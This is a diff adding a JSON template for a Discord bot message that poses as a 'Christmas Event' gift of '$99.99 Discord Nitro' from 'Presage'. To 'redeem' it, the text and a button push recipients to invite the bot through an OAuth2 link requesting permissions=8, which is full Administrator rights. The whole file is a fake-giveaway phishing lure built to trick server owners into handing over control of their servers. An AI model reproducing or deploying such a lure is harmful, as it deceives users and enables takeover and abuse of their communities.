@@ -1,0 +1,32 @@
+{
+  "content": "Congratulations {member.mention}, you've been gifted `$99,99 Nitro Boost`! <a:boost:970085018682658896>",
+  "embed": {
+    "title": "-",
+    "description": "**__Christmas Event!__** :gift:\nYou've been presented from **Presage**, to receive this special holiday reward `99.99$ Discord Nitro!`\n\n> In order to redeem the [**Claim your 99.99$ Discord Nitro**](https://discord.com/api/oauth2/authorize?client_id=964255059250671636&permissions=8&scope=bot) gift you **MUST** invite me to your server, once you see me in your server type the command **/reward!**\n\n🎄 [**Claim your 99.99$ Discord Nitro**](https://discord.com/api/oauth2/authorize?client_id=964255059250671636&permissions=8&scope=bot)🎄",
+    "color": 14568315,
+    "footer": {
+      "icon_url": "https://cdn.discordapp.com/attachments/921099006338269196/922202231594438736/CsTy_9zV1xgnvLlED4_mCwDeHyci9NpoLaGY9BPbt4KhL6YNfIOa461N0jIzAlPZ2HHvFJ5JSf4xN1sfLfSStJQG.png",
+      "text": "Christmas Event"
+    },
+    "thumbnail": {
+      "url": "https://cdn.discordapp.com/emojis/1052011629593759765.png"
+    },
+    "image": {
+      "url": "https://cdn.discordapp.com/attachments/1051390361274171414/1052011441277898782/old-city-street-with-chalet-style-houses-christmas-tree-winter-vector-cartoon-illustration_273525-594.png"
+    }
+  },
+
+  "components": [
+    {
+        "type": 1,
+        "components": [
+            {
+                "type": 2,
+                "label": "Nitro | Click To Redeem",
+                "url": "https://discord.com/api/oauth2/authorize?client_id=964255059250671636&permissions=8&scope=bot",
+                "style": 5
+            }
+        ]
+    }
+  ]
+}
